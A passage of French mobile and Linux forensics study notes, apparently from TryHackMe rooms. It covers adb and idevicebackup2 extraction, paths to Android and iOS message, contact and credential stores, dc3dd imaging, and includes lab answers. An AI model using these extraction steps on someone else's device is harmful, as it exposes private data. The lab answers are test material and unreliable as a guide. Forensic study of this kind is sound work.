l\u0026rsquo;\u0026ldquo;interaction zéro\u0026rdquo;, était capable de choses telles que:\nLecture des courriels, accès aux photos Lire les messages Suivi par GPS Enregistrement des appels téléphoniques, du microphone et de la caméra sans aucune connaissance de l\u0026rsquo;utilisateur Obligation de captation Ayant très peu de traces de présence Acquisition Niveaux d\u0026rsquo;acquisition Quand nous parlons d\u0026rsquo;acquisition on se réfère à la profondeur et à la méthode nécessaire pour extraire les données d\u0026rsquo;appareils. Les méthodes utilisé sont déterminé par différents facteurs :\nAge de l\u0026rsquo;appareil (par exemple version installée du système d\u0026rsquo;exploitation, mises à jour, etc.) Mécanismes de sécurité en place Accès authentique ou non authentifié (c\u0026rsquo;est-à-dire verrouillé ou déverrouillé) Disponibilité d\u0026rsquo;outillage pour l\u0026rsquo;examinateur Profondeur des données que nous souhaitons récupérer (c\u0026rsquo;est-à-dire les données supprimées) En Forensic Mobile on a 4 niveaux d\u0026rsquo;acquisition :\nMéthode d\u0026rsquo;acquisition Description Cas d\u0026rsquo;utilisation Niveau d\u0026rsquo;accès Manuel Collecte d’informations en interagissant directement avec l’appareil (ex. parcourir des messages, photographier l’écran). Utile si l’appareil est déverrouillé, car de nombreux mécanismes de sécurité sont déjà contournés. Soulève toutefois des problèmes d’intégrité et de non-répudiation. Accès limité aux journaux et bases de données système Logique Extraction de données via les fonctionnalités du système d’exploitation (API, sauvegardes, etc.). Pertinent quand l’appareil est verrouillé mais peut être authentifié via un autre dispositif de confiance. Accès partiel Système de fichiers Copie complète de l’arborescence et des fichiers système/applicatifs. Requiert souvent une vulnérabilité, un MDM, un jailbreak/root ou des outils spécialisés pour obtenir un accès privilégié. Accès effectif Physique Image bit-à-bit du stockage, incluant les données supprimées. Très utile en analyse forensique, surtout pour les anciens appareils. Plus difficile sur les modèles récents à cause du chiffrement et des protections matérielles. Accès total (si pas de chiffrement au repos) Maintien d\u0026rsquo;accès Comme absolument tout appareils il est important de garder le dispositif déverrouillé pour avoir le meilleur des scénario une analyse optimal.\nUne désactivation du verrouillage automatique peut être un moyen efficace pour que l\u0026rsquo;appareil reste déverrouillé pendant l\u0026rsquo;analyse.\nIl peut être également judicieux de mettre le téléphone en mode avion (pour éviter l\u0026rsquo;altération des données à distance, dans le cadre d\u0026rsquo;iCloud par exemple)\nAcquisition logique Cette méthode est l\u0026rsquo;une des plus sûre pour garder l\u0026rsquo;intégrité des données/preuves, car rien est écrasé ou modifié sur le téléphone.\nLe problème avec cette méthodes c\u0026rsquo;est qu\u0026rsquo;elle ne prend pas les fichiers systèmes par exemple.\nNous pouvons réaliser ce genre d\u0026rsquo;extraction avec 3uTools, libimobiledevice, adb \u0026hellip;\nPour un iPhone on peut utiliser idevicebackup2\n1 2 3 4 5 6 7 cmnatic@thm-dev$ idevicebackup2 backup --full ./backup Started \u0026#34;com.apple.mobilebackup2\u0026#34; service on port 49174. Negotiated Protocol Version 2.1 Starting backup... Backup will be unencrypted. Requesting backup from device... Full backup mode. [=========================== ] 55% Finished Receiving files [==================================================] 100% (12.6 MB/12.5 MB) [==================================================] 100% (12.6 MB/12.5 MB) [==================================================] 100% (12.7 MB/12.5 MB) [==================================================] 100% (12.7 MB/12.5 MB) [==================================================] 100% (12.7 MB/12.5 MB) Pour un Android ADB\n1 2 3 4 5 6 cmnatic@thm-dev$ adb backup -apk -shared -all -f backup.ab Backing up data... Please wait. Writing android application package (APK) files... Writing shared storage files... Backup Complete! Acquisition du système de fichiers 1 2 3 4 5 6 7 8 9 cmnatic@thm-dev$ adb pull /data /mnt/android_backup pull: building file list... pull: /data/anr/traces.txt -\u0026gt; /mnt/android_backup/anr/traces.txt pull: /data/system/packages.xml -\u0026gt; /mnt/android_backup/system/packages.xml pull: /data/system/users/0.xml -\u0026gt; /mnt/android_backup/system/users/0.xml pull: /data/data/com.android.providers.contacts/databases/contacts2.db -\u0026gt; /mnt/android_backup/data/com.android.providers.contacts/databases/contacts2.db ... [100%] /data -\u0026gt; /mnt/android_backup Technique d\u0026rsquo;acquisition avancé Utilitaires spécialisés Les Spécialiste logiciel et matériel utilise des suites spécialisé comme Cellebrite UFED, qui est une matérielle et logicielle d\u0026rsquo;exfiltration et d\u0026rsquo;analyse des données. Il est légalement réservé aux organismes gouvernementaux.\nJailbreaking Le Jailbreak consiste à exploiter une faille connue pour fournir un accès \u0026ldquo;niveau local\u0026rdquo;, ce qui permet un contrôle COMPLET de l\u0026rsquo;appareil. Cette technique permet un accès non filtré mais le modifie de manière permanente, donc les preuves, ne serons pas scientifiquement fondé.\nCustom Boot Loading Cette technique consiste à faire démarrer l\u0026rsquo;appareil mobile dans un système d\u0026rsquo;exploitation temporaire et personnalisé qui fournit un accès de bas niveau à l\u0026rsquo;appareil et contourne les mécanismes de sécurité. Il diffère des autres, comme Jailbreaking, car il ne modifie pas de façon permanente l\u0026rsquo;appareil, ce qui le rend scientifiquement rationnel.\nBrute Force Méthode obsolète car nous avons des temps d\u0026rsquo;attente bien trop long.\n","date":"2025-12-09T00:00:00Z","permalink":"http://localhost:1313/p/mobile-acquisition/","title":"Mobile - Acquisition"},{"content":"Architecture Android L\u0026rsquo;architecture d\u0026rsquo;Android est superposée et modulaire, ce qui la rend polyvalente et complexe d\u0026rsquo;un point de vue Forensic. Elle est composé des couche suivantes :\nNoyau Linux C\u0026rsquo;est la base du système, elle va fournir des fonctionnalités de base du système. Elle agit comme couche entre l\u0026rsquo;hardware et le software\nServices de base Gestion des processus Gestion de la mémoire Conducteurs de dispositifs Bibliothèques Native Elles fournissent des fonctionnalités de base du système et aux applications.\nBibliothèques du système Cadres pour les médias Moteur de base de données SQLite Moteur de navigateur WebKit Framework Application Elle fournit des API pour des niveau plus haut, comme la localisation, la téléphonie \u0026hellip;\nAPI pour le développement d\u0026rsquo;applications Gestion des ressources Interaction des composants Traitement des services Application La couche la plus haute de l\u0026rsquo;architecture Android. Elle comprend le système et les applications installé par l\u0026rsquo;utilisateur. C\u0026rsquo;est la principale source de données dans une enquêtes Forensic.\nDemandes d\u0026rsquo;utilisation Applications du système Applications de tiers Système de fichiers Android Android utilise un système de fichier basé sur Linux qui partitionne et met des \u0026ldquo;couches\u0026rdquo; pour gérer les données de manière sécurisée et efficace. La structure est personnalisée en fonction du matériel et de l\u0026rsquo;OS.\nPartitions du système de fichier 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ├── system/ → Android OS system files (read-only in user mode) │ ├── bin/ → System binaries │ ├── lib/ → Shared libraries │ └── framework/ → Java framework .jar files │ ├── data/ → Main user data partition │ ├── app/ → Installed APKs │ ├── data/ → App private data │ ├── misc/ → Misc system info (e.g., WiFi configs) │ ├── media/ → Encrypted storage mount point │ └── system/ → User accounts, settings │ ├── sdcard/ (or /storage/emulated/0) → User files, photos, downloads │ ├── vendor/ → OEM-specific binaries/libraries │ └── dev/, proc/, sys/ → Kernel and device interfaces (like Linux)` Analyse d\u0026rsquo;une image Nous avons un fichier .ad1, nous l\u0026rsquo;importons dans FTK Imager. Ensuite nous avons accès à certains fichiers de l\u0026rsquo;appareil suspect : Le but de l\u0026rsquo;exercice ici est de trouver le numéro de série qui se trouve dans /system/build.prop: Artefacts Pour commencer nous allons devoir poser les bases et se demandé quelles information vont être importantes ou non.\nVoici une liste d\u0026rsquo;artefacts qui peuvent être intéressant selon notre enquête.\nSMS et Journaux d\u0026rsquo;Appels Emplacement :\nSMS (et MMS) : /data/data/com.android.providers.telephony/databases/mmssms.db Journaux d\u0026rsquo;appel : /data/data/com.android.providers.contacts/databases/calllog.db Contacts Emplacement :\nContacts : /data/services/com.android.providers.contacts/databases/contacts2.db Historique du navigateur Emplacement (Chrome) :\n/data/data/com.android.chrome/app-chrome/par défaut/history Données de localisation Emplacement :\n/data/data/com.google.android.gms/databases/ (location.db, networklocations.db ou com.google.android.location) Mediatech Emplacement :\n/sdcard/DCIM/ /sdcard/Pictures/ /sdcard/WhatsApp/Media/ Données d\u0026rsquo;applications Emplacement :\n/data/data/(app.package.name)/ Par exemple: /data/data/com.instagram.android/ ou /data/com.snapchat.android/ Compte utilisateurs Emplacement :\n/data/system/users/0/accounts.db /data/data/com.google.android.gms/databases Information sur les applications installé Emplacement :\n/system/packages.xml Outils commercial Il y a 3 types d\u0026rsquo;exfiltration de données sur android :\nType Description Logique Comme en utilisant une sauvegarde pour obtenir des données au niveau de l\u0026rsquo;utilisateur. Système de fichiers Donne l\u0026rsquo;accès aux dossiers et aux fichiers système. Il permet un accès plus profond que l\u0026rsquo;acquisition logique, y compris les répertoires d\u0026rsquo;applications et le stockage interne, ce qui est utile pour examiner les données et les configurations des applications. Physique Une copie bit par bit de la mémoire complète de l\u0026rsquo;appareil, y compris des données supprimées, un espace non alloué et des zones du système inaccessibles par des acquisitions de plus haut niveau. Les outils Nom Fonction Utilisation ALEAPP Artifact Parser Extracts and parses key Android artifacts (e.g., app data, location, usage stats). Autopsy + Android Modules GUI Forensics Suite Examines logical dumps with plugin support for call logs, messages, and app data. Cellebrite UFED Commercial Mobile Forensics Platform Physical, file system, and logical Android (and iOS) device extraction. Magnet AXIOM Commercial Suite Ingests Android images and categorizes artifacts using timeline, chats, media, etc. Oxygen Forensic Detective Commercial All-in-One Tool Recovers deleted data, decrypts apps, and parses communications and cloud data. ADB (Android Debug Bridge) Command-line Interface Communicates with the Android device, collects logs, and performs manual file extraction (root may be needed). TWRP Recovery Custom Recovery Interface Used to boot into a custom recovery mode for image acquisition or data access. LiME (Linux Memory Extractor) Memory Dumping Tool It captures volatile memory (RAM) from an Android device and is used for live memory forensics. Andriller Device Analysis + Unlock Tool Extracts device data, PIN cracking, and report generation from Android backups. ADB-Backup Extractors Backup Utilities Converts Android ADB backups (.ab files) into accessible .tar archives. Protobuf Parsers Data Format Parser Parses Android usage stats, app events, and settings stored in Protobuf format. Analyse des artefacts SMS On se rends dans le fichier nécessaire :\n1 2 3 4 cd C:\\Users\\Administrator\\Desktop\\Evidence\\suspicious_device\\data\\data\\com.android.providers.telephony\\databases sqlite3 mmssms.db .tables On envoie une requête SQL pour nous afficher TOUT les messages de la base sms : Journal d\u0026rsquo;appel Comme à l\u0026rsquo;étape précédente, on se rend au chemin nécessaire :\n1 2 3 4 cd C:\\Users\\Administrator\\Desktop\\Evidence\\suspicious_device\\data\\data\\com.android.providers.contacts\\databases sqlite3 mmssms.db .tables Et ainsi de suite pour les différentes base de données.\naLEAPP Nous venons de faire une analyse d\u0026rsquo;artefact à la main, c\u0026rsquo;est fastidieux de faire ça. Nous pouvons donc utilisé un outil dont nous avons parlé tout à l\u0026rsquo;heure : aLEAPP\nAnalyse Android aLEAPP analyse et fournit un rapport lisible par nous. Il possède 2 interface, une graphique et l\u0026rsquo;autre en ligne de commande.\nGUI python aleappgui.py Il prend des fichier .zip/.tar/.gz.\nUne fois le fichier en .zip donné, un fichier de sortie et lancé l\u0026rsquo;analyse nous pouvons cliquer sur Open Report and Close Le rapport s\u0026rsquo;ouvrira dans le navigateur. ","date":"2025-12-09T00:00:00Z","permalink":"http://localhost:1313/p/mobile-analyse-android/","title":"Mobile - Analyse Android"},{"content":"Introduction Depuis 2018, Apple impose un certificat de confiance, ce qui restreint l\u0026rsquo;accès des appareils vers les iPhone. Cette fonctionnalité permet de désactivé/activé l\u0026rsquo;entré/la sortie des données de l\u0026rsquo;iPhone.\nUne fois le certificat validé par les deux appareils, nous pouvons le trouver (sur Windows dans le chemin ci-dessous) : C:\\ProgramData\\Apple\\Lockdow Info à savoir Ce certificat est valable pendant 30 jours. Il contient des identifiants unique du téléphone. Il est stocké sur l\u0026rsquo;iPhone et sur le PC.\nBloqué \u0026amp; Débloqué Lorsqu’un iPhone est protégé par un mécanisme d’authentification (Face ID, Touch ID ou code d’accès), l’appareil active automatiquement les protections associées à l’état « verrouillé ».\nCes méthodes d’authentification ne se limitent pas à empêcher un tiers d’accéder à l’appareil : elles renforcent également la sécurité en arrière-plan grâce à plusieurs mécanismes supplémentaires.\nLe tableau ci-dessous présente un aperçu des protections disponibles lorsque l’iPhone est dans cet état.\nProtection Explication Chiffrement du fichier Tous les fichiers sur l\u0026rsquo;iPhone sont cryptés au repos. L\u0026rsquo;authentification doit pouvoir lire les données dans les fichiers. Accessibilité des fichiers Fichiers avec le NSFileProtectionCompletela classe de protection des données et les autres sont inaccessibles. Seuls les fichiers marqués de la NSFileProtectionNonesont accessibles dans cet état. Accès matériel Par défaut, l\u0026rsquo;accès à des composants matériels \u0026ldquo;sensibles\u0026rdquo; tels que le microphone, la caméra, etc., les nouveaux appariements Bluetooth sont refusés. Accès aux applications Les fonctions d\u0026rsquo;application qui s\u0026rsquo;exécutent en arrière-plan (i.e. La musique, les cartes \u0026ldquo;témoillaire\u0026rdquo;, etc.) ne sont autorisées à circuler que dans cet état. Accès à la chaîne de clés Le porte-clés iOS (c\u0026rsquo;est-à-dire les mots de passe stockés) n\u0026rsquo;est accessible qu\u0026rsquo;après que l\u0026rsquo;appareil est entré dans l\u0026rsquo;état \u0026ldquo;Débloqué\u0026rdquo;. Confiance et appariement La mise en place de l\u0026rsquo;iPhone dans des appareils pour lesquels il n\u0026rsquo;existe pas de certificat de confiance nécessite l\u0026rsquo;authentification de l\u0026rsquo;utilisateur. Classes de protection des données iOS fait une étape supplémentaire en matière de sécurité en introduisant des Classes de Protection des Données. Ces classes sont des politiques appliquées aux dossiers qui déterminent:\nLorsque le fichier peut être lu ou écrit Lorsque la clé de chiffrement devient disponible pour déverrouiller le fichier Le tableau ci-dessous résume les quatre classes primaires de protection des données.\nClasse de protection des données Exemple État requis NSFileProtectionNone Cache. Aucune - toujours accessible. NSFileProtectionComplète UnlessOpen Des applications qui jouent de l\u0026rsquo;audio et de la vidéo, permettant aux médias de diffuser en continu lorsque l\u0026rsquo;appareil est verrouillé. Exige que le fichier soit ouvert en déverrouillé, mais reste accessible après verrouillage de l\u0026rsquo;appareil. NSFileProtectionCompleteUntilFirstAuthentication Lecture et écriture des données en arrière-plan (par exemple, nombre d\u0026rsquo;étapes, notifications). Le dispositif doit être déverrouillé une fois après le démarrage, mais le fichier reste accessible même après qu\u0026rsquo;il soit verrouillé ultérieurement. NSFileProtectionComplete Domimtiques, messages, données sanitaires. Exige que l\u0026rsquo;appareil soit déverrouillé. Préservation des preuve Sur un iPhone il y a plusieurs manières de supprimer des preuves à distance (comme la fonctionnalité supprimer cet appareil dans l\u0026rsquo;application Find My. Ces méthodes sont présente pour ne pas donné d\u0026rsquo;information personnel en cas de vol.\nPour ce protéger de la suppression d\u0026rsquo;un appareil à distance nous pouvons le placer dans une cage de faraday (ou un sac de faraday).\nSystème de fichier Sur un iPhone disposant d\u0026rsquo;un système ultérieur à 10.3 (2017), le système de fichier sera APFS. Si le système est antérieur à 10.3, le système de fichier sera HFS.\nA savoir sur HFS :\nn\u0026rsquo;est pas chiffré n\u0026rsquo;a pas de checksum A savoir sur APFS :\nChiffrement complet du disque Une gestion plus intelligente des données Utilise la structure de partition GPT A un checksum Et de nombreux mécanismes de protection contre les accidents (tels que la protection des métadonnées) Pour information, les applications installé sur un iPhone n\u0026rsquo;as pas un accès direct au système de fichier. Elles s\u0026rsquo;exécutent dans une sandbox avec un système de fichier \u0026ldquo;virtuel\u0026rdquo; que seul l\u0026rsquo;app peut voir.\nDomaine Description Données Stocke les données d\u0026rsquo;application, les paramètres et les fichiers d\u0026rsquo;utilisateurs. Cache Stocke des fichiers temporaires tels que des fichiers mis en cache à partir du navigateur web. Système Ce domaine stocke des fichiers essentiels liés au système d\u0026rsquo;exploitation. Normalement, il est en lecture seule pour protéger la sécurité du système d\u0026rsquo;exploitation. Partage Ce domaine permet de partager les données provenant d\u0026rsquo;applications réalisées par le même développeur (groupe d\u0026rsquo;applications). Répertoire Répertoire Contexte Description /System/Bibliothèque/ Système Les données qui sont essentielles pour le système d\u0026rsquo;exploitation iOS (telles que les polices, les cadres système, les composants d\u0026rsquo;interfaces utilisateur, etc.) sont stockées ici. /tmp/ Système Les fichiers temporaires relatifs au fonctionnement normal de l\u0026rsquo;iPhone sont stockés ici. Il s\u0026rsquo;agit notamment des téléchargements en cours, des journaux, des vidanges de crash, des caches, etc. /System/Applications/ Système Ce répertoire est l\u0026rsquo;endroit où sont stockées les données pour des applications système pré-installées telles que Weather, Clock, Wallet, etc. /Conteneurs/Données/Application/ Utilisateur Des applications non par défaut telles que celles de l\u0026rsquo;App Store sont stockées ici. Il est important de noter que, en raison du bac à sable, les applications ne peuvent pas accéder aux données d\u0026rsquo;une autre application. Le bac à sable est expliqué plus loin. /Médies/ Utilisateur Des médias tels que des photos et des vidéos du rouleau de la caméra (y compris des métadonnées), ainsi que des enregistrements audio et des livres électroniques sont stockés ici. /Bibliothèque/ Utilisateur Les données d\u0026rsquo;application telles que le carnet d\u0026rsquo;adresses, le calendrier, les SMS, le téléphone, les préférences, le safari, etc., sont stockées ici. /Documents/ Utilisateur Les fichiers téléchargés ou les fichiers créés par l\u0026rsquo;utilisateur sont stockés ici. Par exemple, les fichiers PDF, MP4/MP3, les téléchargements de Safari, etc. Type de fichiers La majorité des fichiers que nous trouverons serions au format Plists, XML et SQLites.\nArtefacts Nous allons voir où se trouve les différentes information importante :\nContacts : /HomeDomain/Library/AddressBook SQLite Photos : /CameraRollDomain/Media/DCIM (HEIC) Calendrier : /HomeDomain/Library/Calendar SQLite WiFi : /SystemPreferencesDomain (Plists) Navigateur : /HomeDomain/Library/Safari Répertoire /var/mobile : Données Description Documents Fichiers créés soit par l\u0026rsquo;utilisateur, soit par l\u0026rsquo;application (sauvegarder des fichiers, fichiers PDF sauvegardés, etc.). Bibliothèque Configuration et fichiers cache pour l\u0026rsquo;OS. Tmp Dossiers temporaires habituellement utilisés par les demandes. Données de l\u0026rsquo;utilisateur Téléchargements d\u0026rsquo;utilisateurs ainsi que photos, vidéos et autres médias. /var/keychains : Données Description Mots de passe Ce répertoire stocke des informations d\u0026rsquo;identification sauvegardées (pour les sites web, etc.) connues sous le nom d\u0026rsquo;Apple. Certificats Cet annuaire stocke des certificats SSL/TLS pour des applications web, des VPN, etc. Clés de cryptage et jetons Cet annuaire stocke diverses clés publiques ainsi que des jetons OAuth et autres. /var/logs : Données Description Logements de réseau Ces types de logs se rapportent aux performances et aux événements du système, ainsi qu\u0026rsquo;à un enregistrement des événements déclenchés par le noyau. Loges d\u0026rsquo;application Les applications stockent leurs journaux dans ce répertoire. Il peut s\u0026rsquo;agir de traces de cheminées et d\u0026rsquo;informations de débogage en cas d\u0026rsquo;accident d\u0026rsquo;application. Débogage Ces types de journaux conservent des informations sur les événements du système qui peuvent être utilisés dans le débogage, tels que l\u0026rsquo;activité réseau, les applications en cours d\u0026rsquo;exécution et une chronologie des événements. Actualisation des journaux Ces journaux contiennent des informations spécifiquement pour les mises à jour, c\u0026rsquo;est-à-dire la vérification des mises à jour et le stockage des informations lors de la mise à jour de l\u0026rsquo;iPhone. /var/db : Données Description Bases de données de systèmes Des informations telles que les contacts, les messages et les entrées de calendrier sont stockées dans ces bases de données. Bases de données d\u0026rsquo;application Les applications stockent leurs données dans ces bases de données, telles que la progression du jeu, une liste de contacts, de boîtes aux lettres, etc. Métadonnées Les informations relatives aux métadonnées pour les médias (photos, vidéos) sont stockées ici, telles que le temps nécessaire, l\u0026rsquo;emplacement, etc. Analyse Pour l\u0026rsquo;analyse nous avons plusieurs outils. La librairie libimobiledevice, outil en CLI qui s\u0026rsquo;utilise comme montré ci-dessous :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026gt; ideviceinfo ActivationState: Activated ActivationStateAcknowledged: true ChipSerialNo: 00EAaUAXXXXXXX DeviceClass: iPhone DeviceColor: 1 DeviceName: iPhone PasswordProtected: false PhoneNumber: +44 REDACTED PkHash: Hz9b38WSRXREDACTED ProductName: iPhone OS ProductType: iPhone10,5 ProductVersion: 14.6 La sauvegarde se fait avec la commande suivante : `\n1 idevicebackup2 backup --full ./backup Nous pouvons utiliser un outil en GUI, 3uTools.\nPour l\u0026rsquo;analyse existe un outil du nom de iLEAPP (la version apple de a LEAPP).\nPratique J\u0026rsquo;ai un dump d\u0026rsquo;un téléphone. On me demande de trouver sur quel réseau Wi-Fi il est connecté : Sur la machine que nous possédons, nous avons un .exe qui se nomme strings64.exe pour nous aider à trouver les flags nécessaire.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 strings64.exe com.apple.wifi.known-networks.plist bplist00 \u0026#34;Sm_ wifi.network.ssid.Wifi Extra_ wifi.network.ssid.OneMinuteStaff_ wifi.network.ssid. Wifi Extra_ wifi.network.ssid.Wifi+ !YAddReasonVHiddenZEAPProfile_ PasspointSPRoamingEnabledYUpdatedAtTSSIDWAddedAt^__OSSpecific___ SupportedSecurityTypes[PayloadUUID^Carrier Bundle ^AcceptEAPTypes JWifi Extra3A WAP_MODE_ %DisableWiFiAutoJoinUntilFirstUserJoin WPA/WPA2 Enterprise_ $BBDC8872-781A-4DF4-AAB8-E8C91F549B7B #$%\u0026amp;\u0026#39;()*+,- 012MNORYAddReasonVHidden[LowDataModeTSSIDWAddedAt^__OSSpecific__^JoinedByUserAt_ SupportedSecurityTypes^CaptiveProfileYUpdatedAt]WiFi Settings KBens Iphone3A 3456789: \u0026lt;@C WiFiNetworkAttributeIsMoving_ BEACON_PROBE_INFO_PER_BSSID_LISTUBSSID_ networkKnownBSSListKey_ $WiFiNetworkAttributeProminentDisplayWCHANNEL_ #WiFiNetworkPasswordModificationDateWAP_MODE 5\u0026gt;?@ OTA_SYSTEM_INFO_SENT_ OTA_SYSTEM_INFO_BEACON_ONLY_SENT_ e2:89:ce:37:cf:a6 EF85GHIJ]CHANNEL_FLAGSZlastRoamed e2:89:ce:37:cf:a6 ]WPA2 Personal ^CaptiveNetwork TUVWXYZ[\\]^ defgklYAddReasonVHiddenZEAPProfile_ PasspointSPRoamingEnabledYUpdatedAtTSSIDWAddedAt^__OSSpecific___ SupportedSecurityTypes[PayloadUUID^Carrier Bundle ab^AcceptEAPTypes K Wifi Extra3A WAP_MODE_ %DisableWiFiAutoJoinUntilFirstUserJoin WPA/WPA2 Enterprise_ $9F1520B9-4397-4E78-86BB-5FA33CD958EC nopqrstuvwx YAddReasonVHiddenZEAPProfile_ PasspointSPRoamingEnabledYUpdatedAtTSSIDWAddedAt^__OSSpecific___ SupportedSecurityTypes[PayloadUUID^Carrier Bundle {|^AcceptEAPTypes EWifi+3A WAP_MODE_ %DisableWiFiAutoJoinUntilFirstUserJoin WPA/WPA2 Enterprise_ $AB504232-98FF-4BDC-B68D-8203C4358A6E 0Pp Ici 4 SSID ressortes grâce au préfixe wifi.network.ssid.. Celui qui nous intéresse est OneMinuteStaff\n1 2 3 Q : What is the name (SSID) of the Wi-Fi network the iPhone connected to? A : OneMinuteStaff Ensuite, on nous demande de qui est notre principal concurrent enregistré dans nos contacts. On se rend dans l\u0026rsquo;AdressBook Grâce à SQLite. et on voir qu\u0026rsquo;une seule personne qui travaille dans la même société que nous Wayne Garcey.\n1 2 3 4 Q : What are the saved contact details for the competitor? Answer format: Firstname,Lastname A : Wayne,Garcey Pour finir on nous demande de retrouver la date de l\u0026rsquo;échange. Dans la base Calendar.sqlite.db nous avons une table CalendarItem, si on va dessus et que nous cherchons dans ma colonne id 1 nous pouvons tomber sur la date du 30/03/2024\n1 2 3 4 5 Q : On what day was the exchange of information to take place? Answer format: DD/MM/YYYY A : 30/03/2024 ","date":"2025-12-09T00:00:00Z","permalink":"http://localhost:1313/p/mobile-analyse-ios/","title":"Mobile - Analyse iOS"},{"content":"Introduction Chaque OS a une structure et une configuration propre à eux, ils nécessite donc d\u0026rsquo;avoir plusieurs technique d\u0026rsquo;Imaging. Ici nous verrons comment faire une capture d\u0026rsquo;image d\u0026rsquo;un système Linux.\nRésumé des commandes et variables d\u0026rsquo;environnement : set -o history\nActive l’historique dans le shell, permettant d’enregistrer les commandes exécutées.\nshopt -s histappend\nFait en sorte que les nouvelles commandes soient ajoutées au fichier d’historique, au lieu d’écraser le contenu précédent quand le shell se ferme.\nexport HISTCONTROL=\nSupprime tous les filtres qui empêchent certaines commandes d’être sauvegardées. Ainsi, toutes les commandes sont enregistrées.\nexport HISTIGNORE=\nDésactive l’exclusion de commandes spécifiques (par motif). Aucune commande n’est ignorée.\nexport HISTFILE=~/.bash_history\nDéfinit le fichier où est stocké l’historique des commandes.\nexport HISTFILESIZE=-1\nSupprime la limite du nombre de lignes stockées dans le fichier d’historique.\nexport HISTSIZE=-1\nSupprime la limite du nombre de commandes retenues en mémoire dans l’historique de la session courante.\nexport HISTTIMEFORMAT=\u0026quot;%F %R \u0026quot;\nAjoute un horodatage (AAAA-MM-JJ HH:MM) devant chaque commande sauvegardée dans l’historique\nSystème de fichiers Voir les disques montés sur la machine 1 df Les disque physique sont identifié grave au /dev. Le disque pour booté l\u0026rsquo;OS sur cette machine est /dev/root. Ici le disque que nous allons monté n\u0026rsquo;est pas répertorié car c\u0026rsquo;est un disque virtuel attaché à une interface loop. Nous pourrons voir notre disque virtuel avec lsblk -a (IMPORTANT: il est nécessaire de voir la taille du disque que nous allons \u0026ldquo;cloner\u0026rdquo; car il faut avoir la place nécessaire à ce clonnage sur notre machine)\nOn peut avoir plus d\u0026rsquo;info sur le disque avec la commande sudo losetup -l /dev/loop11 Ou encore plus d\u0026rsquo;info comme l\u0026rsquo;UUID avec sudo blkid /dev/loop11\nQuestion THM 1 2 3 Q : What command can be used to list all block devices in Linux OS? A : lsblk 1 2 3 Q : Which bash command displays all commands executed in a session? A : history Création de l\u0026rsquo;image Dans cet exercice nous allons utiliser l\u0026rsquo;outil dc3dd, une amélioration de la commande dd.\nRésumé clair des outils d’imagerie / récupération (version courte) dd\nUtilitaire Unix standard pour copier et convertir des fichiers/flux. Souvent utilisé pour créer des images brutes de disques (raw), cloner des partitions ou écrire des images sur des périphériques. Simple, disponible partout, mais sans protections ni vérifications intégrées.\ndc3dd\nVariante améliorée de dd orientée informatique légale : ajoute des fonctions comme le calcul d’hash (MD5/SHA1), enregistrement des métadonnées et options de logging. Utile quand tu veux créer des images tout en gardant des preuves vérifiables.\nddrescue\nOutil spécialisé en récupération de données depuis des supports dégradés. Copie intelligemment en plusieurs passes (priorise les zones lisibles puis tente les secteurs défectueux), garde une trace de l’état (fichier de log) pour reprendre la récupération. Idéal pour sauver un maximum de données sur un disque endommagé.\nFTK Imager\nOutil graphique (GUI) largement utilisé en criminalistique numérique pour créer des images d’un disque, visualiser le contenu et exporter des fichiers. Pratique pour les utilisateurs qui préfèrent une interface visuelle et pour générer des images et rapports complets.\nGuymager\nImagerie médico-légale avec interface graphique, supporte plusieurs formats (raw, E01, etc.) et génère des logs détaillés. Conçu pour être rapide, multi-thread et convivial — bon choix pour examiner/imaginer plusieurs disques depuis une GUI sous Linux.\nEWF tools (ewfacquire, etc.)\nEnsemble d’outils pour créer/manipuler des images au format Expert Witness Format (E01), le format courant en criminalistique. Permet d’acquérir des images compatibles avec d’autres suites forensiques et de gérer métadonnées et segments d’image.\nCommençons la création de l\u0026rsquo;image : sudo dc3dd if=/dev/loop11 of=example1.img log=imaging_loop11.txt\nif : fichier d\u0026rsquo;entrée of : fichier de sortie log : enregistre les sorties dans ce fichier Pour vérifier la sortie nous entrons cette commande :\n1 ls -alh example1.img Nous pouvons voir que l\u0026rsquo;image fait la même taille que /dev/loop11.\nContrôle de l\u0026rsquo;intégrité Nous allons comparer le hash md5 pour vérifier l\u0026rsquo;intégrité du fichier. pour l\u0026rsquo;image que nous venons de faire : sudo md5sum example1.img pour le disque que nous avons \u0026ldquo;cloné\u0026rdquo; : sudo md5sum /dev/loop11 Autres types d\u0026rsquo;images Imagerie à distance\nAcquisition d’une image via le réseau, sans accès physique direct à la machine.\n🔹 Utile dans les enquêtes où la machine est éloignée ou doit rester en service.\n🔹 Exemples : récupération sur un serveur distant, forensic à distance via SSH ou outils spécialisés.\nImages USB\nCréation d’une image complète du contenu d’une clé USB (ou tout autre périphérique amovible).\n🔹 Permet de conserver une copie exacte (secteur par secteur).\n🔹 Utile pour l’analyse forensique, la sauvegarde ou la duplication d’USB bootables.\nImages Docker\nSnapshot du système de fichiers et de la configuration d’un conteneur Docker.\n🔹 Pas une image disque classique, mais une image logicielle qui capture l’état et les dépendances d’un conteneur.\n🔹 Utile pour figer l’environnement d’exécution d’une application et la partager/rejouer à l’identique.\nPour continuer l\u0026rsquo;exercice nous allons monté notre image example1.img avec la commande mount, pour commencer le montage de cette image nous allons créer un point de montage dans /mnt/ avec la commande sudo mkdir -p /mnt/example1. Nous pouvons passer au montage : sudo mount -o loop example1.img /mnt/example1 Nous avons monté example1.\nCas pratique 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 practical@ip-10-10-82-246:~$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT loop0 7:0 0 28.1M 1 loop /snap/amazon-ssm-agent/2012 loop1 7:1 0 70.6M 1 loop /snap/lxd/16922 loop2 7:2 0 55.3M 1 loop /snap/core18/1885 loop3 7:3 0 97.8M 1 loop /snap/core/10185 loop4 7:4 0 1G 0 loop xvda 202:0 0 40G 0 disk └─xvda1 202:1 0 40G 0 part / xvdh 202:112 0 1G 0 disk practical@ip-10-10-82-246:~$ sudo dc3dd if=/dev/loop4 of=loop4.img log=imaging_loop4.txt dc3dd 7.2.646 started at 2025-10-01 09:07:30 +0000 compiled options: command line: dc3dd if=/dev/loop4 of=loop4.img log=imaging_loop4.txt device size: 2097152 